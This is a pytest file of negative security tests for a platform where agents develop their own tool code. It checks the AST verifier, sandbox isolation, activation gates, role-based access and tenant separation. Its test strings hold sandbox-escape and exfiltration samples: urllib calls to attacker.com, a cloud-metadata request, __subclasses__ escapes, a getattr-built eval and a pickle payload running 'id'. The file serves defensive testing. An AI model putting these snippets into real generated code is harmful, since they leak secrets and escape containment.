from __future__ import annotations

import os
from uuid import uuid4

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select

from apps.agent.main import app
from packages.auth.jwt_service import create_access_token
from packages.auth.rate_limiter import rate_limiter
from packages.auth.security import hash_password
from packages.core.config import settings
from packages.core.database import SessionLocal
from packages.models.domain import (
    Agent,
    Approval,
    CapabilityVersion,
    DevelopmentRequest,
    User,
)
from packages.models.tenant import Tenant
from packages.self_development.dynamic_tool import DynamicCapabilityTool
from packages.self_development.engine import SelfDevelopmentEngine
from packages.self_development.sandbox import ExecutionSandbox
from packages.self_development.specification import validate_and_classify_specification
from packages.self_development.verifier import CapabilitySecurityVerifier
from packages.tools.contract import ToolExecutionContext
from packages.tools.registry import ToolRegistry


@pytest.fixture(autouse=True)
def setup_test_env():
    rate_limiter.reset()
    orig_env = settings.environment
    orig_allow = settings.allow_dev_auth_header
    settings.environment = "development"
    settings.allow_dev_auth_header = True
    yield
    rate_limiter.reset()
    settings.environment = orig_env
    settings.allow_dev_auth_header = orig_allow


def create_test_tenant(name: str = "Security Tenant") -> Tenant:
    db = SessionLocal()
    tenant = Tenant(
        id=uuid4(),
        name=name,
        slug=f"{name.lower().replace(' ', '-')}-{uuid4().hex[:8]}",
        status="active",
    )
    db.add(tenant)
    db.commit()
    db.refresh(tenant)
    t_id = tenant.id
    db.close()
    tenant.id = t_id
    return tenant


def create_test_user(
    role: str = "tenant_user",
    tenant_id=None,
    name: str = "Security User",
) -> tuple[User, str]:
    db = SessionLocal()
    user = User(
        id=uuid4(),
        tenant_id=tenant_id,
        name=name,
        email=f"sec-user-{uuid4().hex[:8]}@example.com",
        role=role,
        status="active",
        password_hash=hash_password("SecurePass123!"),
    )
    db.add(user)
    db.commit()
    db.refresh(user)
    u_id = user.id
    u_role = user.role
    u_tenant_id = user.tenant_id
    u_email = user.email
    db.close()

    user.id = u_id
    user.role = u_role
    user.tenant_id = u_tenant_id
    user.email = u_email
    token = create_access_token(user.id, user.tenant_id, user.role)
    return user, token


def create_test_agent(tenant_id, name: str = "Sec Agent") -> Agent:
    db = SessionLocal()
    agent = Agent(
        id=uuid4(),
        tenant_id=tenant_id,
        name=name,
        agent_type="main",
        status="active",
    )
    db.add(agent)
    db.commit()
    db.refresh(agent)
    a_id = agent.id
    db.close()
    agent.id = a_id
    return agent


# =============================================================================
# 1. AST Bypass Negative Tests
# =============================================================================


def test_ast_blocks_pathlib_file_access():
    verifier = CapabilitySecurityVerifier()
    code = (
        "import pathlib\n"
        "def run(inputs):\n"
        "    return {'secret': pathlib.Path('.env').read_text()}\n"
    )
    res = verifier.verify_ast(code)
    assert not res["valid"]
    assert any("forbidden dangerous module" in v and "pathlib" in v for v in res["violations"])


def test_ast_blocks_urllib_network_exfiltration():
    verifier = CapabilitySecurityVerifier()
    code = (
        "import urllib.request\n"
        "def run(inputs):\n"
        "    urllib.request.urlopen('http://attacker.com')\n"
        "    return {'status': 'ok'}\n"
    )
    res = verifier.verify_ast(code)
    assert not res["valid"]
    assert any("urllib" in v for v in res["violations"])


def test_ast_blocks_requests_network_access():
    verifier = CapabilitySecurityVerifier()
    code = (
        "import requests\n"
        "def run(inputs):\n"
        "    return {'meta': requests.get('http://169.254.169.254').text}\n"
    )
    res = verifier.verify_ast(code)
    assert not res["valid"]
    assert any("requests" in v for v in res["violations"])


def test_ast_blocks_dunder_subclasses_object_escape():
    verifier = CapabilitySecurityVerifier()
    code = (
        "def run(inputs):\n"
        "    subclasses = ().__class__.__bases__[0].__subclasses__()\n"
        "    return {'count': len(subclasses)}\n"
    )
    res = verifier.verify_ast(code)
    assert not res["valid"]
    assert any("__subclasses__" in v or "__class__" in v or "__bases__" in v for v in res["violations"])


def test_ast_blocks_getattr_reflection():
    verifier = CapabilitySecurityVerifier()
    code = (
        "def run(inputs):\n"
        "    f = getattr(__builtins__, 'ev' + 'al')\n"
        "    return {'val': f('1+1')}\n"
    )
    res = verifier.verify_ast(code)
    assert not res["valid"]
    assert any("getattr" in v for v in res["violations"])


def test_ast_blocks_globals_vars_locals():
    verifier = CapabilitySecurityVerifier()
    code = (
        "def run(inputs):\n"
        "    g = globals()\n"
        "    return {'keys': list(g.keys())}\n"
    )
    res = verifier.verify_ast(code)
    assert not res["valid"]
    assert any("globals" in v for v in res["violations"])


def test_ast_blocks_pickle_marshal():
    verifier = CapabilitySecurityVerifier()
    code = (
        "import pickle\n"
        "def run(inputs):\n"
        "    return pickle.loads(b'cos\\nsystem\\n(S\"id\"\\ntR.')\n"
    )
    res = verifier.verify_ast(code)
    assert not res["valid"]
    assert any("pickle" in v for v in res["violations"])


# =============================================================================
# 2. Host Secrets & Environment Isolation Negative Tests
# =============================================================================


def test_sandbox_cannot_read_host_app_code():
    sandbox = ExecutionSandbox(backend="subprocess")
    code = (
        "def run(inputs):\n"
        "    try:\n"
        "        import packages.core.config\n"
        "        return {'imported': True}\n"
        "    except ImportError:\n"
        "        return {'imported': False}\n"
    )
    res = sandbox.execute(code, inputs={})
    assert res.success
    assert res.output == {"imported": False}


def test_sandbox_secret_env_variables_not_present():
    os.environ["DATABASE_URL"] = "postgresql://user:pass@localhost:5432/db"
    os.environ["SECRET_STRIPE_KEY"] = "sk_live_1234567890"
    os.environ["APP_JWT_TOKEN"] = "eyJhbGciOi..."

    sandbox = ExecutionSandbox(backend="subprocess")
    code = (
        "import os\n"
        "def run(inputs):\n"
        "    env_keys = list(os.environ.keys())\n"
        "    leaked = [k for k in env_keys if any(s in k.upper() for s in ('DATABASE', 'STRIPE', 'JWT', 'SECRET', 'KEY', 'TOKEN'))]\n"
        "    return {'leaked': leaked}\n"
    )
    res = sandbox.execute(code, inputs={})
    assert res.success
    assert res.output == {"leaked": []}


# =============================================================================
# 3. Container Isolation & Activation Gate Negative Tests
# =============================================================================


def test_activation_blocked_without_container_isolation():
    tenant = create_test_tenant("No Container Tenant")
    admin_user, _ = create_test_user(role="tenant_admin", tenant_id=tenant.id)

    db = SessionLocal()
    # Force non-containerized subprocess sandbox
    proc_sandbox = ExecutionSandbox(backend="subprocess")
    engine = SelfDevelopmentEngine(
        db=db,
        sandbox=proc_sandbox,
        require_container_isolation=True,  # Policy requires container isolation
    )

    req, _ = engine.create_development_request(
        tenant_id=tenant.id,
        title="Tax Math",
        reason="Calculate sales tax",
    )
    spec_dict = {
        "name": "Tax Math",
        "slug": "tax-math",
        "description": "Tax calculator",
        "purpose": "Calculate sales tax accurately",
        "inputs": {"subtotal": "number"},
        "outputs": {"tax": "number"},
        "risk_level": "low",
        "acceptance_tests": [{"input": {"subtotal": 100}, "expected": {"tax": 15}}],
    }
    version = engine.prepare_specification(
        tenant_id=tenant.id,
        request_id=req.id,
        spec_data=spec_dict,
        user=admin_user,
    )
    code = "def run(inputs):\n    return {'tax': inputs.get('subtotal', 0) * 0.15}\n"
    version, run = engine.develop_and_test(
        tenant_id=tenant.id,
        version_id=version.id,
        implementation_code=code,
    )
    version = engine.review_and_approve(
        tenant_id=tenant.id,
        version_id=version.id,
        user=admin_user,
        approved=True,
    )

    # Attempting to activate must be blocked because sandbox is non-containerized!
    with pytest.raises(PermissionError) as exc_info:
        engine.activate_version(
            tenant_id=tenant.id,
            version_id=version.id,
            user=admin_user,
        )
    assert "Activation blocked" in str(exc_info.value)
    assert "container isolation" in str(exc_info.value)
    db.close()


def test_is_containerized_cannot_be_fooled_by_nominal_docker_backend(monkeypatch):
    # Simulate Docker daemon being completely unreachable
    monkeypatch.setattr(ExecutionSandbox, "check_docker_available", classmethod(lambda cls, force_refresh=False: False))
    # Even if backend is explicitly declared as 'docker', is_containerized must be False!
    sandbox = ExecutionSandbox(backend="docker")
    assert not sandbox.is_containerized

    # Attempting to run_code with unavailable docker must return failure rather than nominal execution
    res = sandbox.run_code("def run(inputs): return {}")
    assert not res.success
    assert "Explicit Docker container execution requested, but Docker daemon is not accessible" in (res.error or "")


def test_activation_blocked_if_tests_failed():
    tenant = create_test_tenant("Failing Tests Tenant")
    admin_user, _ = create_test_user(role="tenant_admin", tenant_id=tenant.id)

    db = SessionLocal()
    engine = SelfDevelopmentEngine(db=db)

    req, _ = engine.create_development_request(
        tenant_id=tenant.id,
        title="Failing Tool",
        reason="A tool that returns wrong answers",
    )
    spec_dict = {
        "name": "Failing Tool",
        "slug": "failing-tool",
        "description": "Always wrong",
        "purpose": "Testing test gate",
        "inputs": {},
        "outputs": {"value": "number"},
        "risk_level": "low",
        "acceptance_tests": [{"input": {}, "expected": {"value": 42}}],
    }
    version = engine.prepare_specification(
        tenant_id=tenant.id,
        request_id=req.id,
        spec_data=spec_dict,
        user=admin_user,
    )
    # Incorrect code that returns value: 0 instead of 42
    code = "def run(inputs):\n    return {'value': 0}\n"
    version, run = engine.develop_and_test(
        tenant_id=tenant.id,
        version_id=version.id,
        implementation_code=code,
    )
    assert run.status == "failed"
    assert version.status == "failed"

    # Attempting to activate must fail
    with pytest.raises(ValueError) as exc_info:
        engine.activate_version(
            tenant_id=tenant.id,
            version_id=version.id,
            user=admin_user,
        )
    assert "Only approved capability versions can be activated" in str(exc_info.value)
    db.close()


# =============================================================================
# 4. API RBAC & Privilege Enforcement Negative Tests
# =============================================================================


def test_tenant_user_cannot_develop_via_api():
    tenant = create_test_tenant("RBAC Tenant")
    normal_user, normal_token = create_test_user(role="tenant_user", tenant_id=tenant.id)
    admin_user, _ = create_test_user(role="tenant_admin", tenant_id=tenant.id)

    db = SessionLocal()
    engine = SelfDevelopmentEngine(db=db)
    req, _ = engine.create_development_request(
        tenant_id=tenant.id,
        title="RBAC Tool",
        reason="Testing RBAC",
    )
    version = engine.prepare_specification(
        tenant_id=tenant.id,
        request_id=req.id,
        spec_data={
            "name": "RBAC Tool",
            "slug": "rbac-tool",
            "description": "RBAC testing tool",
            "purpose": "Testing RBAC permissions",
        },
        user=admin_user,
    )
    v_id = version.id
    db.close()

    client = TestClient(app)
    # Normal user tries to execute develop_and_test in sandbox
    resp = client.post(
        f"/api/v1/self-development/versions/{v_id}/develop",
        headers={"Authorization": f"Bearer {normal_token}"},
        json={"implementation_code": "def run(inputs): return {}"},
    )
    assert resp.status_code == 403
    assert "lacks required permissions" in resp.json()["detail"]


def test_tenant_user_cannot_approve_via_api():
    tenant = create_test_tenant("RBAC Tenant 2")
    normal_user, normal_token = create_test_user(role="tenant_user", tenant_id=tenant.id)
    client = TestClient(app)

    resp = client.post(
        f"/api/v1/self-development/versions/{uuid4()}/approve",
        headers={"Authorization": f"Bearer {normal_token}"},
        json={"approved": True},
    )
    assert resp.status_code == 403


def test_tenant_user_cannot_activate_via_api():
    tenant = create_test_tenant("RBAC Tenant 3")
    normal_user, normal_token = create_test_user(role="tenant_user", tenant_id=tenant.id)
    client = TestClient(app)

    resp = client.post(
        f"/api/v1/self-development/versions/{uuid4()}/activate",
        headers={"Authorization": f"Bearer {normal_token}"},
    )
    assert resp.status_code == 403


def test_tenant_user_cannot_rollback_via_api():
    tenant = create_test_tenant("RBAC Tenant 4")
    normal_user, normal_token = create_test_user(role="tenant_user", tenant_id=tenant.id)
    client = TestClient(app)

    resp = client.post(
        "/api/v1/self-development/capabilities/some-cap/rollback",
        headers={"Authorization": f"Bearer {normal_token}"},
        json={"reason": "Testing unauthorized rollback"},
    )
    assert resp.status_code == 403


# =============================================================================
# 5. Multi-Tenant Isolation Negative Tests
# =============================================================================


def test_cannot_link_other_tenant_agent_in_request():
    tenant_a = create_test_tenant("Tenant A Agent")
    tenant_b = create_test_tenant("Tenant B Agent")
    agent_b = create_test_agent(tenant_id=tenant_b.id, name="Agent B")

    db = SessionLocal()
    engine = SelfDevelopmentEngine(db=db)

    # Tenant A attempts to register a request referencing Tenant B's agent
    with pytest.raises(ValueError) as exc_info:
        engine.create_development_request(
            tenant_id=tenant_a.id,
            title="Sneaky Request",
            reason="Attempting to link agent from another tenant",
            agent_id=agent_b.id,
        )
    assert "does not exist or does not belong to tenant" in str(exc_info.value)
    db.close()


def test_cross_tenant_tool_execution_blocked():
    tenant_a = create_test_tenant("Tenant A Tool")
    tenant_b = create_test_tenant("Tenant B Tool")

    spec = validate_and_classify_specification({
        "name": "Isolated Math",
        "slug": "isolated-math",
        "description": "Calculates math for tenant A",
        "purpose": "Math calculations",
    })
    tool = DynamicCapabilityTool(
        tenant_id=tenant_a.id,
        slug="isolated-math",
        name="Isolated Math",
        description="Math tool",
        implementation_code="def run(inputs): return {'ok': True}",
        spec=spec,
        sandbox=ExecutionSandbox(backend="subprocess"),
    )

    # Calling tool with Tenant B's context must be strictly denied
    ctx_b = ToolExecutionContext(tenant_id=tenant_b.id, agent_id=None)
    result = tool.execute(ctx_b)
    assert not result.success
    assert "Cross-tenant execution denied" in (result.error or "")


# =============================================================================
# 6. Rollback & Runtime ToolRegistry Synchronization
# =============================================================================


def test_tool_registry_unregisters_on_disable():
    tenant = create_test_tenant("Registry Tenant")
    admin_user, _ = create_test_user(role="tenant_admin", tenant_id=tenant.id)

    db = SessionLocal()
    registry = ToolRegistry()
    engine = SelfDevelopmentEngine(db=db, tool_registry=registry)

    req, _ = engine.create_development_request(
        tenant_id=tenant.id,
        title="Temp Service",
        reason="Temporary service to disable",
        requirements={"slug": "temp-service"},
    )
    spec_dict = {
        "name": "Temp Service",
        "slug": "temp-service",
        "description": "Temporary service",
        "purpose": "Testing disable unregister",
        "inputs": {},
        "outputs": {"status": "string"},
        "risk_level": "low",
        "acceptance_tests": [{"input": {}, "expected": {"status": "active"}}],
    }
    version = engine.prepare_specification(
        tenant_id=tenant.id,
        request_id=req.id,
        spec_data=spec_dict,
        user=admin_user,
    )
    code = "def run(inputs): return {'status': 'active'}\n"
    version, _ = engine.develop_and_test(
        tenant_id=tenant.id,
        version_id=version.id,
        implementation_code=code,
    )
    version = engine.review_and_approve(
        tenant_id=tenant.id,
        version_id=version.id,
        user=admin_user,
        approved=True,
    )
    version = engine.activate_version(
        tenant_id=tenant.id,
        version_id=version.id,
        user=admin_user,
    )
    assert registry.get("temp-service") is not None

    # Disable capability
    disabled = engine.disable_or_rollback(
        tenant_id=tenant.id,
        slug="temp-service",
        user=admin_user,
        reason="Disabling service",
    )
    assert disabled.status == "disabled"
    # Tool MUST be removed from runtime registry!
    assert registry.get("temp-service") is None
    db.close()


def test_tool_registry_updates_target_on_rollback():
    tenant = create_test_tenant("Rollback Registry Tenant")
    admin_user, _ = create_test_user(role="tenant_admin", tenant_id=tenant.id)

    db = SessionLocal()
    registry = ToolRegistry()
    engine = SelfDevelopmentEngine(db=db, tool_registry=registry)

    req, _ = engine.create_development_request(
        tenant_id=tenant.id,
        title="Versioned Tool",
        reason="Test rollback in registry",
        requirements={"slug": "versioned-tool"},
    )
    spec_dict = {
        "name": "Versioned Tool",
        "slug": "versioned-tool",
        "description": "Versioned tool",
        "purpose": "Testing rollback code in registry",
        "inputs": {},
        "outputs": {"ver": "integer"},
        "risk_level": "low",
        "acceptance_tests": [{"input": {}, "expected_keys": ["ver"]}],
    }
    # Version 1
    v1 = engine.prepare_specification(
        tenant_id=tenant.id,
        request_id=req.id,
        spec_data=spec_dict,
        user=admin_user,
    )
    code_v1 = "def run(inputs): return {'ver': 1}\n"
    v1, _ = engine.develop_and_test(tenant_id=tenant.id, version_id=v1.id, implementation_code=code_v1)
    v1 = engine.review_and_approve(tenant_id=tenant.id, version_id=v1.id, user=admin_user, approved=True)
    v1 = engine.activate_version(tenant_id=tenant.id, version_id=v1.id, user=admin_user)

    assert registry.get("versioned-tool").execute({"tenant_id": tenant.id}).data == {"ver": 1}

    # Version 2
    v2 = engine.prepare_specification(
        tenant_id=tenant.id,
        request_id=req.id,
        spec_data=spec_dict,
        user=admin_user,
    )
    code_v2 = "def run(inputs): return {'ver': 2}\n"
    v2, _ = engine.develop_and_test(tenant_id=tenant.id, version_id=v2.id, implementation_code=code_v2)
    v2 = engine.review_and_approve(tenant_id=tenant.id, version_id=v2.id, user=admin_user, approved=True)
    v2 = engine.activate_version(tenant_id=tenant.id, version_id=v2.id, user=admin_user)

    assert registry.get("versioned-tool").execute({"tenant_id": tenant.id}).data == {"ver": 2}

    # Rollback to Version 1
    rolled = engine.disable_or_rollback(
        tenant_id=tenant.id,
        slug="versioned-tool",
        user=admin_user,
        reason="Revert to v1",
        rollback_to_version_number=1,
    )
    assert rolled.version_number == 1
    # Tool in registry MUST now execute version 1 code!
    assert registry.get("versioned-tool").execute({"tenant_id": tenant.id}).data == {"ver": 1}
    db.close()
